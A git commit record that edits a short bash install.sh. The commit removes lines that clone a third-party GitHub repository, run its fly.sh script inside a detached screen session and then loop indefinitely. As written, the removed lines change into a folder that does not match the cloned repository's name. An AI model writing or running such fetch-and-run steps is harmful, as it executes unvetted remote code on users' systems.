b42643838642cef278a85afaf7edffa2ec49d72e
botakgng <86042499+botakgng@users.noreply.github.com>
2021-06-17 14:42:22 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,10 +1,3 @@
 #!/bin/bash
 sudo apt update
 sudo apt install screen -y
-git clone https://github.com/micin69/pretty-fly.git && cd micin69
-screen -dmS ls
-chmod +x fly.sh && ./fly.sh
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
